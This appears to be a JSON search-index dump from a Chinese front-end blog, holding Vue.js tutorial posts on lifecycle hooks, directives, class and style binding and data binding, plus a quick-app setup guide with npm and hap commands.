我们也可以通过全局config.keyCodes 对象自定义键值修饰符别名 1Vue.config.keyCodes.f1 = 112 、","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue生命周期（五）","slug":"2018-03-vue-lifecircle","date":"2018-08-26T09:21:32.000Z","updated":"2018-10-24T03:46:02.443Z","comments":true,"path":"note/3ab58e3e.html","link":"","permalink":"https://ru23.com/note/3ab58e3e.html","excerpt":"","text":"每个Vue实例在被创建之前都要经过一系列的初始化过程,这个过程就是vue的生命周期 一、生命周期钩子函数 beforeCreate created beforeMount mounted beforeUpdate updated beforeDestroy destroyed 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960var vm = new Vue(&#123; el: '#app', data: &#123; message: 'Vue的生命周期' &#125;, beforeCreate: function() &#123; console.group('------beforeCreate创建前状态------'); console.log(\"%c%s\", \"color:red\" , \"el : \" + this.$el); //undefined console.log(\"%c%s\", \"color:red\",\"data : \" + this.$data); //undefined console.log(\"%c%s\", \"color:red\",\"message: \" + this.message) &#125;, created: function() &#123; console.group('------created创建完毕状态------'); console.log(\"%c%s\", \"color:red\",\"el : \" + this.$el); //undefined console.log(\"%c%s\", \"color:red\",\"data : \" + this.$data); //已被初始化 console.log(\"%c%s\", \"color:red\",\"message: \" + this.message); //已被初始化 &#125;, beforeMount: function() &#123; console.group('------beforeMount挂载前状态------'); console.log(\"%c%s\", \"color:red\",\"el : \" + (this.$el)); //已被初始化 console.log(this.$el); console.log(\"%c%s\", \"color:red\",\"data : \" + this.$data); //已被初始化 console.log(\"%c%s\", \"color:red\",\"message: \" + this.message); //已被初始化 &#125;, mounted: function() &#123; console.group('------mounted 挂载结束状态------'); console.log(\"%c%s\", \"color:red\",\"el : \" + this.$el); //已被初始化 console.log(this.$el); console.log(\"%c%s\", \"color:red\",\"data : \" + this.$data); //已被初始化 console.log(\"%c%s\", \"color:red\",\"message: \" + this.message); //已被初始化 &#125;, beforeUpdate: function () &#123; console.group('beforeUpdate 更新前状态===============》'); console.log(\"%c%s\", \"color:red\",\"el : \" + this.$el); console.log(this.$el); console.log(\"%c%s\", \"color:red\",\"data : \" + this.$data); console.log(\"%c%s\", \"color:red\",\"message: \" + this.message); &#125;, updated: function () &#123; console.group('updated 更新完成状态===============》'); console.log(\"%c%s\", \"color:red\",\"el : \" + this.$el); console.log(this.$el); console.log(\"%c%s\", \"color:red\",\"data : \" + this.$data); console.log(\"%c%s\", \"color:red\",\"message: \" + this.message); &#125;, beforeDestroy: function () &#123; console.group('beforeDestroy 销毁前状态===============》'); console.log(\"%c%s\", \"color:red\",\"el : \" + this.$el); console.log(this.$el); console.log(\"%c%s\", \"color:red\",\"data : \" + this.$data); console.log(\"%c%s\", \"color:red\",\"message: \" + this.message); &#125;, destroyed: function () &#123; console.group('destroyed 销毁完成状态===============》'); console.log(\"%c%s\", \"color:red\",\"el : \" + this.$el); console.log(this.$el); console.log(\"%c%s\", \"color:red\",\"data : \" + this.$data); console.log(\"%c%s\", \"color:red\",\"message: \" + this.message) &#125; &#125;) image.png 二、生命周期详解 vue实例在创建过程中调用的几个生命周期钩子 2.1 beforeCreate、created 在beforeCreate和created钩子函数之间的生命周期 在这个生命周期之间，进行初始化事件，进行数据的观测，可以看到在created的时候数据已经和data属性进行绑定（放在data中的属性当值发生改变的同时，视图也会改变）,此时还是没有el选项 2.2 created、beforeMount created钩子函数和beforeMount间的生命周期 image.png 首先会判断对象是否有el选项。如果有的话就继续向下编译，如果没有el选项，则停止编译，也就意味着停止了生命周期，直到在该vue实例上调用vm.$mount(el)。 此时注释掉代码中 el: &#39;#app&#39;, 然后运行可以看到到created的时候就停止了 image.png 如果我们在后面继续调用vm.$mount(el),可以发现代码继续向下执行了 vm.$mount(el) //这个el参数就是挂在的dom接点 template参数选项的有无对生命周期的影响 如果vue实例对象中有template参数选项，则将其作为模板编译成render函数 如果没有template选项，则将外部HTML作为模板编译 可以看到template中的模板优先级要高于outer HTML的优先级 修改代码如下, 在HTML结构中增加了一串html，在vue对象中增加了template选项 1234567891011121314151617181920212223&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;vue生命周期学习&lt;/title&gt; &lt;script src=\"https://cdn.bootcss.com/vue/2.4.2/vue.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"app\"&gt; &lt;!--html中修改的--&gt; &lt;h1&gt;&#123;&#123;message + '这是在outer HTML中的'&#125;&#125;&lt;/h1&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; var vm = new Vue(&#123; el: '#app', template: \"&lt;h1&gt;&#123;&#123;message +'这是在template中的'&#125;&#125;&lt;/h1&gt;\", //在vue配置项中修改的 data: &#123; message: 'Vue的生命周期' &#125;&lt;/script&gt;&lt;/html&gt; 输出 Vue的生命周期--这是在template中的 那么将vue对象中template的选项注释掉后打印如下信息 输出 Vue的生命周期--这是在outer HTML中的 可以想想什么el的判断要在template之前了~是因为vue需要通过el找到对应的outer template 在vue对象中还有一个render函数，它是以createElement作为参数，然后做渲染操作，而且我们可以直接嵌入JSX. 123456new Vue(&#123; el: '#app', render: function(createElement) &#123; return createElement('h1', 'this is createElement') &#125;&#125;) 所以综合排名优先级 render函数选项 &gt; template选项 &gt; outer HTML 2.3 beforeMount、mounted beforeMount和mounted钩子函数间的生命周期 image.png 可以看到此时是给vue实例对象添加$el成员，并且替换掉挂在的DOM元素。因为在之前console中打印的结果可以看到beforeMount之前el上还是undefined 2.4 mounted image.png 在mounted之前h1中还是通过{message}进行占位的，因为此时还有挂在到页面上，还是JavaScript中的虚拟DOM形式存在的。在mounted之后可以看到h1中的内容发生了变化 2.5 beforeUpdate、updated beforeUpdate钩子函数和updated钩子函数间的生命周期 image.png 当vue发现data中的数据发生了改变，会触发对应组件的重新渲染，先后调用beforeUpdate和updated钩子函数。我们在console中输入 1vm.message = &apos;触发组件更新&apos; 发现触发了组件的更新 2.6 beforeDestroy、destroyed beforeDestroy和destroyed钩子函数间的生命周期 image.png beforeDestroy钩子函数在实例销毁之前调用。在这一步，实例仍然完全可用。 destroyed钩子函数在Vue 实例销毁后调用。调用后，Vue实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue 基本指令（四）","slug":"2018-03-vue-base-directive","date":"2018-08-26T06:10:32.000Z","updated":"2018-10-24T03:46:02.424Z","comments":true,"path":"note/63a9f06.html","link":"","permalink":"https://ru23.com/note/63a9f06.html","excerpt":"","text":"image.png 一、常用指令v-text 更新元素的 textContent 1&lt;h1 v-text=\"msg\"&gt;&lt;/h1&gt; v-html 更新元素的 innerHTML 1&lt;h1 v-html=&quot;msg&quot;&gt;&lt;/h1&gt; v-bind 当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM 12345678910111213141516&lt;!-- 完整语法 --&gt;&lt;a v-bind:href=\"url\"&gt;&lt;/a&gt;&lt;!-- 缩写 --&gt;&lt;a :href=\"url\"&gt;&lt;/a&gt;&lt;script&gt; // 2 创建 Vue 的实例对象 var vm = new Vue(&#123; // el 用来指定vue挂载到页面中的元素，值是：选择器 // 理解：用来指定vue管理的HTML区域 el: '#app', // 数据对象，用来给视图中提供数据的 data: &#123; url: 'http://www.baidu.com' &#125; &#125;) &lt;/script&gt; v-on 作用：绑定事件 语法：v-on:click=&quot;say&quot; or v-on:click=&quot;say(&#39;参数&#39;, $event)&quot; 简写：@click=&quot;say&quot; 说明：绑定的事件从methods中获取 12345678910111213141516171819&lt;!-- 完整语法 --&gt;&lt;a v-on:click=\"doSomething\"&gt;&lt;/a&gt;&lt;!-- 缩写 --&gt;&lt;a @click=\"doSomething\"&gt;&lt;/a&gt;&lt;!-- 方法传参 --&gt;&lt;a @click=\"doSomething（“123”）\"&gt;&lt;/a&gt; &lt;script&gt; // 2 创建 Vue 的实例对象 var vm = new Vue(&#123; el: '#app', // methods属性用来给vue实例提供方法（事件） methods: &#123; doSomething: function(str) &#123; //接受参数，并输出 console.log(str); &#125; &#125; &#125;) &lt;/script&gt; 事件修饰符 .stop 阻止冒泡，调用 event.stopPropagation() .prevent 阻止默认事件，调用 event.preventDefault() .capture 添加事件侦听器时使用事件捕获模式 .self 只当事件在该元素本身（比如不是子元素）触发时触发回调 .once 事件只触发一次 v-model 作用：在表单元素上创建双向数据绑定 说明：监听用户的输入事件以更新数据 12&lt;input v-model=\"message\" placeholder=\"edit me\"&gt;&lt;p&gt;Message is: &#123;&#123; message &#125;&#125;&lt;/p&gt; v-for 基于源数据多次渲染元素或模板块 123456789&lt;!-- 1 基础用法 --&gt;&lt;div v-for=\"item in items\"&gt; &#123;&#123; item.text &#125;&#125;&lt;/div&gt;&lt;!-- item 为当前项，index 为索引 --&gt;&lt;p v-for=\"(item, index) in list\"&gt;&#123;&#123;item&#125;&#125; -- &#123;&#123;index&#125;&#125;&lt;/p&gt;&lt;!-- item 为值，key 为键，index 为索引 --&gt;&lt;p v-for=\"(item, key, index) in obj\"&gt;&#123;&#123;item&#125;&#125; -- &#123;&#123;key&#125;&#125;&lt;/p&gt;&lt;p v-for=\"item in 10\"&gt;&#123;&#123;item&#125;&#125;&lt;/p&gt; key属性 推荐：使用 v-for的时候提供 key 属性，以获得性能提升。 说明：使用 key，VUE会基于 key 的变化重新排列元素顺序，并且会移除 key 不存在的元素。 官方解释：当 Vue.js用 v-for 正在更新已渲染过的元素列表时，它默认用“就地复用”策略。如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序， 而是简单复用此处每个元素，并且确保它在特定索引下显示已被渲染过的每个元素。这个类似 Vue 1.x 的 track-by=&quot;$index&quot; 123&lt;div v-for=\"item in items\" :key=\"item.id\"&gt; &lt;!-- 内容 --&gt;&lt;/div&gt; 二、样式处理 -class和style 说明：这两个都是HTML元素的属性，使用v-bind，只需要通过表达式计算出字符串结果即可 表达式的类型：字符串、数组、对象 1234567891011121314151617181920212223242526272829303132&lt;!-- 1 --&gt;&lt;div v-bind:class=\"&#123; active: true &#125;\"&gt;&lt;/div&gt; ===&gt;&lt;div class=\"active\"&gt;&lt;/div&gt;&lt;!-- 2 --&gt;&lt;div :class=\"['active', 'text-danger']\"&gt;&lt;/div&gt; ===&gt;&lt;div class=\"active text-danger\"&gt;&lt;/div&gt;&lt;!-- 3 --&gt;&lt;div v-bind:class=\"[&#123; active: true &#125;, errorClass]\"&gt;&lt;/div&gt; ===&gt;&lt;div class=\"active text-danger\"&gt;&lt;/div&gt;--- style ---&lt;!-- 1 --&gt;&lt;div v-bind:style=\"&#123; color: activeColor, fontSize: fontSize + 'px' &#125;\"&gt;&lt;/div&gt;&lt;!-- 2 将多个 样式对象 应用到一个元素上--&gt;&lt;div v-bind:style=\"[baseStyles, overridingStyles]\"&gt;&lt;/div&gt;--- script ---&lt;script&gt; // 2 创建 Vue 的实例对象 var vm = new Vue(&#123; el: '#app', data: &#123; activeColor: 'red', fontSize: 30, baseStyles: &#123; color: 'red', 'font-size': '30px' &#125;, overridingStyles: &#123; color: 'green', &#125; &#125; &#125;) &lt;/script&gt; 三、v-if 和 v-show 条件渲染 v-if：根据表达式的值的真假条件，销毁或重建元素 v-show：根据表达式之真假值，切换元素的 display CSS 属性 四、提升用户体验：v-cloak 这个指令保持在元素上直到关联实例结束编译。和 CSS 规则如 [v-cloak] { display: none } 一起用时，这个指令可以隐藏未编译的 Mustache 标签直到实例准备完毕。 防止刷新页面，网速慢的情况下出现{ message }等数据格式 123&lt;div v-cloak&gt; &#123;&#123; message &#125;&#125;&lt;/div&gt; 五、提升性能v-pre 说明：跳过这个元素和它的子元素的编译过程。可以用来显示原始 Mustache 标签。跳过大量没有指令的节点会加快编译 1&lt;span v-pre&gt;&#123;&#123; this will not be compiled &#125;&#125;&lt;/span&gt; v-once 只渲染元素和组件一次。随后的重新渲染，元素/组件及其所有的子节点将被视为静态内容并跳过。这可以用于优化更新性能 1&lt;span v-once&gt;This will never change: &#123;&#123;msg&#125;&#125;&lt;/span&gt; 六、Dom元素获取: v-ref 在父组件上注册一个子组件的索引,便于直接访问,不需要表达式,必须提供参数id。可以通过父组件的$refs对象访问子组件 当v-ref和v-for一起使用时,注册的值将是一个数组，包含多有的子组件，对应于绑定数组；如果v-for使用在一个对象上，注册的值将是一个对象，包含所有的子组件，对应于绑定对象 Dom元素获取: v-el 为Dom元素注册一个索引，方便通过所属实例的$els访问这个元素,可以用v-el：some-el设置this.$els.someEl. 123&lt;span v-el:msg&gt;hello&lt;/span&gt;&lt;span v-el:other-msg&gt;world&lt;/span&gt; 通过this.$els获取相应的DOM元素: 123this.$els.msg.textContent // ==&gt; \"hello\"this.$els.otherMsg.textContent // ==&gt; \"world\"","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue之class与style绑定（三）","slug":"2018-03-vue-bind-class-style","date":"2018-08-26T06:02:32.000Z","updated":"2018-10-24T03:46:02.426Z","comments":true,"path":"note/c1cea378.html","link":"","permalink":"https://ru23.com/note/c1cea378.html","excerpt":"","text":"一、绑定HTML class 有三种方法 1、直接绑定 2、数据属性绑定 3、计算属性绑定 1.1 对象语法 如果数据属性 发生改变，class 列表将相应地更新 123456789101112&lt;div id=\"app\"&gt; &lt;div v-bind:class=\"&#123;active:isActive&#125;\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;var app = new Vue(&#123; el:\"#app\", data:&#123; msg:\"对象语法\", isActive:true &#125;&#125;);&lt;/script&gt; v-bind:class 指令也可以与普通的 class 属性共存 123456789101112131415161718.active&#123; width: 100px; height: 100px; background: red;&#125; &lt;div id=\"app\"&gt; &lt;div class = \"box\" v-bind:class=\"&#123;active:isActive&#125;\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el:\"#app\", data:&#123; msg:\"对象语法\", isActive:true &#125; &#125;);&lt;/script&gt; 可以直接绑定数据里的一个对象 123456789101112131415161718192021.active1&#123; width: 100px; height: 100px; margin-top: 10px; border: 1px solid #ccc ;&#125;&lt;div id=\"app\"&gt; &lt;div v-bind:class=\"classObj\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;var app = new Vue(&#123; el:\"#app\", data:&#123; classObj:&#123; active:true, aaa:false &#125; &#125;&#125;);&lt;/script&gt; 可以在这里绑定返回对象的计算属性。这是一个常用且强大的模式 12345678910111213141516171819202122232425262728&lt;style&gt;.aaa&#123; background: green; width: 100px; height: 100px; margin-top: 10px;&#125;&lt;/style&gt;&lt;div id=\"app\"&gt; &lt;div v-bind:class=\"Obj\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el:\"#app\", data:&#123; msg:\"对象语法\", isActive:true &#125;, computed:&#123; Obj:function()&#123; return&#123; aaa:this.isActive &#125; &#125; &#125; &#125;);&lt;/script&gt; 1.2 数组语法 我们可以把一个数组传给 v-bind:class，以应用一个 class 列表 12345678910111213141516171819202122232425262728&lt;style&gt; .active&#123; width: 100px; height: 100px; background: red; &#125; .active1&#123; color: yellow; &#125; .aaa&#123; border: 5px solid #ccc; &#125;&lt;/style&gt;&lt;div id=\"app\"&gt; &lt;div class = \"box\" v-bind:class=\"[isActive,isActive1,isActive2]\"&gt;&#123;&#123;msg&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el:\"#app\", data:&#123; msg:\"对象语法\", isActive:\"active\", isActive1:\"active1\", isActive2:\"aaa\" &#125; &#125;);&lt;/script&gt; 可以用三元表达式 1234567891011121314151617181920212223242526272829&lt;style&gt; .active&#123; width: 100px; height: 100px; background: red; &#125; .active1&#123; color: yellow; &#125; .aaa&#123; border: 5px solid #ccc; &#125;&lt;/style&gt;&lt;div id=\"app\"&gt; &lt;div class = \"box\" v-bind:class=\"[isActive,isActive1,isActive5 ? isActive2 : '']\"&gt;&#123;&#123;msg&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el:\"#app\", data:&#123; msg:\"对象语法\", isActive5:false, isActive:\"active\", isActive1:\"active1\", isActive2:\"aaa\" &#125; &#125;);&lt;/script&gt; 当有多个条件 class 时这样写有些繁琐。可以在数组语法中使用对象语法 1234567891011121314151617181920212223242526272829&lt;style&gt; .active&#123; width: 100px; height: 100px; background: red; &#125; .active1&#123; color: yellow; &#125; .aaa&#123; border: 5px solid #ccc; &#125;&lt;/style&gt;&lt;div id=\"app\"&gt; &lt;div class = \"box\" v-bind:class=\"[isActive,&#123;active1:isActive5&#125;,isActive5 ? isActive2 : '']\"&gt;&#123;&#123;msg&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el:\"#app\", data:&#123; msg:\"对象语法\", isActive5:true, isActive:\"active\", isActive1:\"active1\", isActive2:\"aaa\" &#125; &#125;);&lt;/script&gt; 1.3 在组件上 在一个自定义组件上用到 class 属性的时候，这些类将被添加到根元素上面，这个元素上已经存在的类不会被覆盖 12345678910111213141516171819202122232425262728293031323334&lt;style&gt; .active1&#123; width: 100px; background: red; &#125; .aaa&#123; border: 5px solid #ccc; &#125; .bbb&#123; height: 100px; &#125;&lt;/style&gt;&lt;div id=\"app\"&gt; &lt;tanchu v-bind:class=\"classObj\"&gt;&lt;/tanchu&gt;&lt;/div&gt;&lt;script&gt; Vue.component('tanchu', &#123; template: `&lt;div class=\"bbb\"&gt; &lt;input type=\"button\" value=\"弹出\"/&gt; &lt;/div&gt;` &#125;) var app = new Vue(&#123; el:\"#app\", data:&#123; classObj:&#123; active1:true, aaa:true &#125; &#125; &#125;)&lt;/script&gt; 二、绑定内联样式2.1 对象语法123456789101112131415161718192021&lt;div id=\"app\"&gt; &lt;div v-bind:style=\"&#123;background:a,border:b,width:c&#125;\"&gt;内联样式&lt;/div&gt; &lt;div v-bind:style=\"classObj\"&gt;内联样式&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el:\"#app\", data:&#123; a:\"red\", b:\"5px solid #ccc\", c:\"100px\" classObj:&#123; background:\"red\", border:\"5px solid #ccc\", width:\"100px\", marginTop:\"10px\" &#125; &#125; &#125;)&lt;/script&gt; 2.2 数组语法1234567891011121314151617181920&lt;div id=\"app\"&gt; &lt;!-- 数组语法 --&gt; &lt;div v-bind:style=\"[classObj,classObj1]\"&gt;内联样式&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el:\"#app\", data:&#123; classObj:&#123; background:\"red\", border:\"5px solid #ccc\", width:\"100px\" &#125;, classObj1:&#123; height:\"100px\" &#125; &#125; &#125;)&lt;/script&gt; 2.3 自动添加前缀 当 v-bind:style 使用需要特定前缀的 CSS 属性时，如 transform，Vue.js 会自动侦测并添加相应的前缀","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue中的数据绑定（二）","slug":"2018-03-vue-data-bind","date":"2018-08-26T06:01:32.000Z","updated":"2018-10-24T03:46:02.431Z","comments":true,"path":"note/d3019ce8.html","link":"","permalink":"https://ru23.com/note/d3019ce8.html","excerpt":"","text":"Vue 对象的改变会直接影响到 HTML 的标签的变化，而且标签的变化也会反过来影响 Vue 对象的属性的变化 一、数据渲染123&lt;div&gt;&#123;message&#125; &lt;/div&gt;&lt;!--数据绑定--&gt;&lt;div v-html=\"htmlMess\"&gt;&lt;/div&gt; &lt;!--html绑定--&gt; &lt;div v-text=\"message\"&gt;&lt;/div&gt; &lt;!--数据绑定--&gt; 二、属性绑定123&lt;h1 v-bind:title=\"message\"&gt;aaa&lt;/h1&gt; &lt;!--属性绑定--&gt;&lt;a v-bind:href=\"url\"&gt;百度&lt;/a&gt; &lt;!--属性绑定--&gt;&lt;a :href=\"url\"&gt;百度&lt;/a&gt; &lt;!--简写--&gt; 三、类名绑定1234567891011121314&lt;!--类绑定，当isActive为true时类名生效--&gt;&lt;div v-bind:class=\"active : isActive\"&gt;&lt;/div&gt; &lt;!--多类名绑定，用逗号隔开--&gt;&lt;div v-bind:class=\"active:isActive,red:isRed\"&gt;&lt;/div&gt;&lt;!--对象类名绑定--&gt;&lt;div v-bind:class=\"classObj\"&gt;&lt;/div&gt; &lt;!--类名数组绑定--&gt;&lt;div v-bind:class=\"[active,red]\"&gt;&lt;/div&gt; &lt;!--三元运算符类名绑定--&gt;&lt;div v-bind:class=\"isActive ? active : red\"&gt;&lt;/div&gt; 四、样式绑定12345678&lt;!--内联样式绑定--&gt;&lt;div v-bind:style=\"&#123;width:width,height:height&#125;\"&gt;&lt;/div&gt; &lt;!--内联样式对象绑定--&gt;&lt;div v-bind:sytle=\"styleObj\"&gt;&lt;/div&gt; &lt;!--内联样式对象数组绑定--&gt;&lt;div v-bind:style=\"[styleObj1,styleObj2]\"&gt;&lt;/div&gt; 五、条件绑定123456789101112131415161718192021&lt;!--条件为真时显示，css中直接有无此元素--&gt;&lt;p v-if=\"seen\"&gt;hahah&lt;/p&gt; &lt;!--效果同if，css中为display：none--&gt;&lt;p v-show=\"seen\"&gt;hah&lt;/p&gt; &lt;!--循环绑定--&gt;&lt;p v-for=\"list in lists\"&gt;&#123;&#123;alist.text&#125;&#125;&lt;/p&gt; &lt;!--绑定lists数组--&gt;&lt;p v-for=\"value in lists\"&gt;&#123;&#123;value&#125;&#125;&lt;/p&gt; &lt;!--值循环输出--&gt;&lt;p v-for=\"(key value) in lists\"&gt;&#123;&#123;key&#125;&#125;:&#123;&#123;value&#125;&#125;&lt;/p&gt; &lt;!--键值对输出--&gt;&lt;p v-for=\"(index key value) in lists\"&gt;&#123;&#123;index&#125;&#125;:&#123;&#123;key&#125;&#125;:&#123;&#123;value&#125;&#125; &lt;/p&gt; &lt;!--索引加键值对输出--&gt;&lt;p v-for=\"n in 10\"&gt;&#123;&#123;n&#125;&#125;&lt;/p&gt; 六、事件绑定12345678910111213141516171819202122232425262728&lt;!--事件对应fun1方法--&gt;&lt;a v-on:click=\"fun1\"&gt;点击&lt;/a&gt; &lt;!--事件绑定简写--&gt;&lt;a @click=\"fun1\"&gt;点击&lt;/a&gt; &lt;!--事件修饰符：--&gt;&lt;!-- 阻止单击事件冒泡 --&gt;&lt;a v-on:click.stop=\"doThis\"&gt;&lt;/a&gt;&lt;!-- 提交事件不再重载页面 --&gt;&lt;form v-on:submit.prevent=\"onSubmit\"&gt;&lt;/form&gt;&lt;!-- 修饰符可以串联 --&gt;&lt;a v-on:click.stop.prevent=\"doThat\"&gt;&lt;/a&gt;&lt;!-- 只有修饰符 --&gt;&lt;form v-on:submit.prevent&gt;&lt;/form&gt;&lt;!-- 添加事件侦听器时使用事件捕获模式 --&gt;&lt;div v-on:click.capture=\"doThis\"&gt;...&lt;/div&gt;&lt;!-- 只当事件在该元素本身（而不是子元素）触发时触发回调 --&gt;&lt;div v-on:click.self=\"doThat\"&gt;...&lt;/div&gt;&lt;!-- click 事件只能点击一次，2.1.4版本新增 --&gt;&lt;a v-on:click.once=\"doThis\"&gt;&lt;/a&gt; 七、按键绑定 相应按键按下时触发 12&lt;input v-on:keyup.enter=\"submit\"&gt;&lt;input @keyup.enter=\"submit\"&gt; 全部的按键别名： .enter .tab .delete (捕获 “删除” 和 “退格” 键) .esc .space .up .down .left .right .ctrl .alt .shift .meta 八、双向绑定12345678910&lt;p&gt;&#123;message&#125;&lt;/p&gt; &lt;!--input输入值将传入Vue中的message--&gt;&lt;input type=\"text\" v-model=\"message\"/&gt; &lt;select v-model=\"message\" id=\"aa\"&gt; &lt;option&gt;百度&lt;/option&gt; &lt;option&gt;腾讯&lt;/option&gt; &lt;option&gt;阿里&lt;/option&gt;&lt;/select&gt; 绑定修饰符 v-model.lazy 将input同步改为change同步 - v-model.mumber 将能转化为数字的字符串转化为数字 v-model.trim 过滤空格","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"初识vue与环境搭建（一）","slug":"2018-03-vue-start","date":"2018-08-26T05:12:32.000Z","updated":"2018-10-24T03:46:02.480Z","comments":true,"path":"note/3658c71f.html","link":"","permalink":"https://ru23.com/note/3658c71f.html","excerpt":"","text":"一、初识 Vue框架是一个MVVM框架，Module和view是双向绑定的。vue没有控制器的概念，它的核心思想是数据驱动，状态管理，以及组件化。 因此在我们js编程中，不会去操作DOM、class，更多的关注我们的数据层面。去改变一个变量，通过变量来控制我们的视图，通过事件绑定、状态管理来进一步渲染视图。 MVVM框架的特点是没有控制器，通过view和module来进行交互，实际上底层已经帮我们封装了 1.1概况 Vue本身不是一个框架 Vue结合周边的生态构成一个灵活的、渐进式的框架 1.2核心思想 数据驱动【只关注数据层面】 组件化 1.3双向数据绑定 Object.defineProperty在双向绑定中起来很重要作用 12&lt;input type=\"text\" id=\"userName\"&gt;&lt;span id=\"uName\"&gt; 1234567891011121314var obj = &#123;&#125;object.defineProerty(obj,\"userName\",&#123; get:()=&gt;&#123; &#125;, set:(val)=&gt;&#123; $(\"#uName\").innerHTML = val $(\"#userName\").value = val; &#125;&#125;)$(\"#userName\").on(\"keyup\",function()&#123; obj.userName = event.target.value&#125;) 1.4 模板语法 数据绑定 msg html语法 v-html 绑定属性 v-bind:id= 使用表达式 ok?&#39;yes&#39;:&quot;no&quot; 文本赋值 v-text= 指令 v-if 过滤器 message|capitalize 和 v-bind:id=&#39;rawld|formatld&#39; 1.5 Class和Style绑定 对象语法：v-bind:class=&quot;{ active:isActive,&#39;text-danger&#39;:hasError }&quot; 数组语法： 12345678910&lt;div v-bind:class=\"[activeClass, errorClass]\"&gt;&lt;/div&gt;&lt;script&gt; new Vue(&#123; data:&#123; activeClass: \"active\", errorClass: 'text-danger' &#125; &#125;) &lt;/script&gt; style绑定-对象语法 v-bind:style=&quot;{color:activeColor,fontSize:fontSize+&quot;px&quot;}&quot; 1.6条件渲染 v-if 如果是false不会被渲染 v-else v-else-if v-show 控制block、none显示 v-cloak 1.7事件处理器 v-on:click=&quot;method&quot; 或者@click=&quot;method&quot; 修饰符：v-on:click.stop、prevent、self、once v-on:keyup.enter、tab、delete(捕获删除、退格键)、space、letf、right 1.8组件 全局组件和局部组件 父子组件通讯、数据传递 Slot (插槽) 在Vue里面消息是单向传递的，只允许父子件向子组件流通，一般使用props。不允许子组件去修改父组件的变量，子组件往父组件传递数据通过$emit(&quot;父组件中自定义的事件名字&quot;)这种方式去触发。父组件的变量发生变化之后，会同步流向子组件 二、环境搭建123456npm install -g vue-clivue init webpack-simple demo# 初始化完整的webpack项目vue init webpack demo2 配置文件 主要关注的是webpack.base.js和config/index.js，其他的都是辅助性工具","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"快应用入门小结篇","slug":"2018-08-quick-app-summary","date":"2018-08-21T10:05:43.000Z","updated":"2018-10-24T03:46:02.554Z","comments":true,"path":"note/97c34044.html","link":"","permalink":"https://ru23.com/note/97c34044.html","excerpt":"","text":"MD原文件 https://github.com/poetries/poetries.github.io/blob/dev/source/_posts/quick-app-summary.md 注册账号通过 https://www.quickapp.cn/docCenter/post/74 一、环境搭建1.1 安装NodeJS 需安装6.0以上版本的NodeJS 1.2 安装hap-toolkit12// hap -V // 会显示安装版本信息npm install -g hap-toolkit 1.3 创建项目工程123456hap init projectName// 增加编译支持hap update --forcecd projectName &amp;&amp; npm i 生成的目录结构 123456789101112├── sign rpk //包签名模块│ └── debug //调试环境│ ├── certificate.pem //证书文件│ └── private.pem //私钥文件├── src│ ├── Common //公用的资源和组件文件│ │ └── logo.png //应用图标│ ├── Demo //页面目录│ | └── index.ux //页面文件，可自定义页面名称│ ├── app.ux //APP文件，可引入公共脚本，暴露公共数据和方法等│ └── manifest.json //项目配置文件，配置应用图标、页面路由等└── package.json //定义项目需要的各种模块及配置信息 src：项目源文件夹 sign：签名模块，当前仅有debug签名，如果内测上线，请添加release文件夹，增加线上签名；签名生成方法详见文档编译工具 编译项目 npm run release # 发布程序包，在 /dist/.signed.rpk，注意需要使用 release 签名模块 npm run build # 生成 build 和 dist 两个目录。前者是临时产出，后者是最终产出 npm run watch # 文件保存时自动编译和调试 手动编译项目 在项目的根目录下，运行如下命令进行编译打包，生成rpk包 1npm run build 编译打包成功后，项目根目录下会生成文件夹：build、dist build：临时产出，包含编译后的页面js，图片等 dist：最终产出，包含rpk文件。其实是将build目录下的资源打包压缩为一个文件，后缀名为rpk，这个rpk文件就是项目编译后的最终产出 自动编译项目 每次修改源代码文件后，都自动编译项目 1npm run watch 在安卓手机上安装调试工具 https://www.quickapp.cn/docCenter/post/69 image.png 1.4 连接手机进行调试 注意：一定要注意手机连接的wifi与电脑所连接的网络需要在同一局域网和网段，需要能够相互访问。 在项目根目录下执行如下命令，启动HTTP调试服务器：（server前需要先npm run build） 1npm run server 开发者可以通过命令行终端或者调试服务器主页看到提供扫描的二维码 